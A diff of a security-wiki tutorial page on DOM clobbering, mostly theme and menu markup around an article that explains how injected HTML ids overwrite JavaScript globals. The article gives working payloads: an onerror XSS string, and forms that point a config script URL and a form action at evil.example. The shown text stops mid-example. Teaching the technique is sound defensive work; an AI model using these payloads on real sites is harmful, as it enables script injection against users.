@@ -1,39 +1,57 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="DOM Clobbering # Description # Browsers have a quirky, decades-old habit - if an HTML element has an id or name attribute, the browser automatically creates a JavaScript global variable with that same name, pointing at the element. This was originally meant to make simple scripts easier to write (document.myForm instead of document.getElementById(&#39;myForm&#39;)).
-The problem: JavaScript code often assumes a variable like window.config or x.attributes will contain whatever the developer intended - a real config object, a real attributes list.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="DOM Clobbering" />
-<meta property="og:description" content="DOM Clobbering # Description # Browsers have a quirky, decades-old habit - if an HTML element has an id or name attribute, the browser automatically creates a JavaScript global variable with that same name, pointing at the element. This was originally meant to make simple scripts easier to write (document.myForm instead of document.getElementById(&#39;myForm&#39;)).
-The problem: JavaScript code often assumes a variable like window.config or x.attributes will contain whatever the developer intended - a real config object, a real attributes list." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>DOM Clobbering | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="DOM Clobbering# Description# Browsers have a quirky, decades-old habit - if an HTML element has an id or name attribute, the browser automatically creates a JavaScript global variable with that same name, pointing at the element. This was originally meant to make simple scripts easier to write (document.myForm instead of document.getElementById(&#39;myForm&#39;)).
+The problem: JavaScript code often assumes a variable like window.config or x.attributes will contain whatever the developer intended - a real config object, a real attributes list. It usually never occurs to the developer that an attacker who can inject plain HTML (no &lt;script&gt; tag needed) could plant an element with that exact id, and silently replace what that variable points to.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="DOM Clobbering">
+	<meta property="og:description" content="DOM Clobbering# Description# Browsers have a quirky, decades-old habit - if an HTML element has an id or name attribute, the browser automatically creates a JavaScript global variable with that same name, pointing at the element. This was originally meant to make simple scripts easier to write (document.myForm instead of document.getElementById(&#39;myForm&#39;)).
+The problem: JavaScript code often assumes a variable like window.config or x.attributes will contain whatever the developer intended - a real config object, a real attributes list. It usually never occurs to the developer that an attacker who can inject plain HTML (no &lt;script&gt; tag needed) could plant an element with that exact id, and silently replace what that variable points to.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="DOM Clobbering">
+	<meta itemprop="description" content="DOM Clobbering# Description# Browsers have a quirky, decades-old habit - if an HTML element has an id or name attribute, the browser automatically creates a JavaScript global variable with that same name, pointing at the element. This was originally meant to make simple scripts easier to write (document.myForm instead of document.getElementById(&#39;myForm&#39;)).
+The problem: JavaScript code often assumes a variable like window.config or x.attributes will contain whatever the developer intended - a real config object, a real attributes list. It usually never occurs to the developer that an attacker who can inject plain HTML (no &lt;script&gt; tag needed) could plant an element with that exact id, and silently replace what that variable points to.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="1900">
+
+<title>DOM Clobbering • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/DOM-Clobbering/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -41,11 +59,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -56,9 +78,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -73,8 +92,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -90,8 +109,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -177,8 +196,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -225,8 +244,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -980,8 +999,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1002,8 +1021,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1024,8 +1043,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1046,8 +1065,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1068,8 +1087,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1103,8 +1122,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1125,8 +1144,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1147,8 +1166,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1169,35 +1188,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1205,30 +1202,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>DOM Clobbering</strong>
+  <h3>DOM Clobbering</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1271,23 +1269,14 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="dom-clobbering">
-  DOM Clobbering
-  <a class="anchor" href="#dom-clobbering">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="dom-clobbering">DOM Clobbering<a class="anchor" href="#dom-clobbering">#</a></h1>
 <hr>
-<h2 id="description">
-  Description
-  <a class="anchor" href="#description">#</a>
-</h2>
+<h2 id="description">Description<a class="anchor" href="#description">#</a></h2>
 <p>Browsers have a quirky, decades-old habit - if an HTML element has an <code>id</code> or <code>name</code> attribute, the browser automatically creates a JavaScript global variable with that same name, pointing at the element. This was originally meant to make simple scripts easier to write (<code>document.myForm</code> instead of <code>document.getElementById('myForm')</code>).</p>
 <p><strong>The problem</strong>: JavaScript code often assumes a variable like <code>window.config</code> or <code>x.attributes</code> will contain whatever the developer intended - a real config object, a real attributes list. It usually never occurs to the developer that an attacker who can inject <em>plain HTML</em> (no <code>&lt;script&gt;</code> tag needed) could plant an element with that exact <code>id</code>, and silently replace what that variable points to.</p>
 <p>That&rsquo;s &ldquo;clobbering&rdquo; - you overwrite (clobber) an existing JavaScript variable using nothing but HTML. No script execution is required to pull it off; the browser does the wiring for you automatically. This makes it a powerful bypass technique: it works even on pages with a strict Content-Security-Policy that blocks all inline scripts, because your payload is never a script - it&rsquo;s just tags.</p>
 <p>Once you&rsquo;ve clobbered a variable the app trusted, the impact depends on what that variable was used for: it can lead to XSS, open redirects, or the app&rsquo;s own logic doing something it shouldn&rsquo;t.</p>
-<h2 id="attack-surfaces">
-  Attack Surfaces
-  <a class="anchor" href="#attack-surfaces">#</a>
-</h2>
+<h2 id="attack-surfaces">Attack Surfaces<a class="anchor" href="#attack-surfaces">#</a></h2>
 <p>Anywhere the app lets you inject raw HTML - even in a place that seems harmless - is a potential entry point, because clobbering doesn&rsquo;t need <code>&lt;script&gt;</code> to work:</p>
 <ul>
 <li>User-controlled HTML injection points</li>
@@ -1304,56 +1293,40 @@ https://github.com/alex-shpak/hugo-book
 <li>Third-party scripts relying on global variables</li>
 <li>Legacy JavaScript codebases</li>
 </ul>
-<h2 id="exploitation-and-bypassing-defenses-using-encoding-and-obfuscation">
-  Exploitation and Bypassing defenses (using encoding and obfuscation)
-  <a class="anchor" href="#exploitation-and-bypassing-defenses-using-encoding-and-obfuscation">#</a>
-</h2>
-<h4 id="1-triggering-xss">
-  1. Triggering XSS
-  <a class="anchor" href="#1-triggering-xss">#</a>
-</h4>
+<h2 id="exploitation-and-bypassing-defenses-using-encoding-and-obfuscation">Exploitation and Bypassing defenses (using encoding and obfuscation)<a class="anchor" href="#exploitation-and-bypassing-defenses-using-encoding-and-obfuscation">#</a></h2>
+<h4 id="1-triggering-xss">1. Triggering XSS<a class="anchor" href="#1-triggering-xss">#</a></h4>
 <p>Consider the following code:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
 </span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;asd&#39;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://url1.com&#39;</span>&gt;
 </span></span><span style="display:flex;"><span>	&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;asd&#39;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http://url2.com&#39;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;spider&#39;</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
-</span></span></code></pre></div><p><strong>What happens here, in order:</strong></p>
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;</span></span></code></pre></div><p><strong>What happens here, in order:</strong></p>
 <ol>
 <li>Two elements share the same <code>id=&quot;asd&quot;</code>. When more than one element shares an <code>id</code>, the browser doesn&rsquo;t pick one - <code>window.asd</code> becomes a collection containing both.</li>
 <li>The second element also has <code>name='spider'</code>. That lets you reach it specifically, as <code>window.asd.spider</code>, instead of getting the whole collection.</li>
 <li>Check this in the browser console:</li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>window.<span style="color:#a6e22e">asd</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>window.<span style="color:#a6e22e">asd</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// → HTMLCollection(2)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>window.<span style="color:#a6e22e">asd</span>.<span style="color:#a6e22e">spider</span>
+</span></span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">asd</span>.<span style="color:#a6e22e">spider</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// → the second &lt;a&gt; tag itself
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>window.<span style="color:#a6e22e">asd</span>.<span style="color:#a6e22e">spider</span>.<span style="color:#a6e22e">toString</span>()
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// → &#34;http://url2.com&#34; (browsers stringify an anchor element to its href value)
-</span></span></span></code></pre></div><p><strong>Why this matters:</strong> if any app code does something like <code>someUrl = window.asd.spider</code> and then uses <code>someUrl</code> in a way that gets rendered or evaluated, you&rsquo;ve smuggled in a value from an <code>href</code> you fully control. Weaponized version:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;asd&#39;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;spider&#39;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;cid:aaa&#34; onerror=&#34;alert(1)&#39;</span>&gt;
-</span></span></code></pre></div><p>When this gets stringified and dropped into an attribute context downstream, the injected <code>onerror=&quot;alert(1)&quot;</code> can fire - turning a config-read into XSS.</p>
-<h4 id="2-global-variable-clobbering">
-  2. Global Variable Clobbering
-  <a class="anchor" href="#2-global-variable-clobbering">#</a>
-</h4>
+</span></span></span><span style="display:flex;"><span>window.<span style="color:#a6e22e">asd</span>.<span style="color:#a6e22e">spider</span>.<span style="color:#a6e22e">toString</span>()
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// → &#34;http://url2.com&#34; (browsers stringify an anchor element to its href value)</span></span></span></code></pre></div><p><strong>Why this matters:</strong> if any app code does something like <code>someUrl = window.asd.spider</code> and then uses <code>someUrl</code> in a way that gets rendered or evaluated, you&rsquo;ve smuggled in a value from an <code>href</code> you fully control. Weaponized version:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;asd&#39;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;spider&#39;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;cid:aaa&#34; onerror=&#34;alert(1)&#39;</span>&gt;</span></span></code></pre></div><p>When this gets stringified and dropped into an attribute context downstream, the injected <code>onerror=&quot;alert(1)&quot;</code> can fire - turning a config-read into XSS.</p>
+<h4 id="2-global-variable-clobbering">2. Global Variable Clobbering<a class="anchor" href="#2-global-variable-clobbering">#</a></h4>
 <p>Inject an element whose <code>id</code>/<code>name</code> matches a global variable so <code>window.varName</code> points to attacker-controlled DOM instead of the real object.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;config&#34;</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;url&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//evil.example/x.js&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;config&#34;</span>&gt;&lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;url&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;//evil.example/x.js&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(window.<span style="color:#a6e22e">config</span>); <span style="color:#75715e">// logs your &lt;form&gt; element, not the app&#39;s real config object
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><p>If the app&rsquo;s own code does <code>window.config.url</code>, it now gets <code>&quot;//evil.example/x.js&quot;</code> instead of the trusted value it expected.</p>
-<h4 id="3-property-clobbering">
-  3. Property Clobbering
-  <a class="anchor" href="#3-property-clobbering">#</a>
-</h4>
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><p>If the app&rsquo;s own code does <code>window.config.url</code>, it now gets <code>&quot;//evil.example/x.js&quot;</code> instead of the trusted value it expected.</p>
+<h4 id="3-property-clobbering">3. Property Clobbering<a class="anchor" href="#3-property-clobbering">#</a></h4>
 <p>Same idea, but instead of clobbering a whole variable, you shadow a <em>property</em> the app expects an object to have - like <code>.action</code> on a form.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;f&#34;</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;f&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;action&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://evil.example&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
@@ -1361,172 +1334,113 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// A form&#39;s real .action property is normally the submit URL —
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// but a child &lt;input name=&#34;action&#34;&gt; can shadow it, so this may resolve
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// to the input element instead of the form&#39;s actual action URL.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><h4 id="4-function-clobbering">
-  4. Function Clobbering
-  <a class="anchor" href="#4-function-clobbering">#</a>
-</h4>
+</span></span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><h4 id="4-function-clobbering">4. Function Clobbering<a class="anchor" href="#4-function-clobbering">#</a></h4>
 <p>If code expects a global <em>function</em> to exist (like a <code>sanitize()</code> helper), and you clobber that name with a DOM element instead, calling it as a function will throw or silently fail - breaking whatever security check depended on it.</p>
 <p>Example:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sanitize&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sanitize&#34;</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span>&gt;
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// The app expected window.sanitize to be a function it could call.
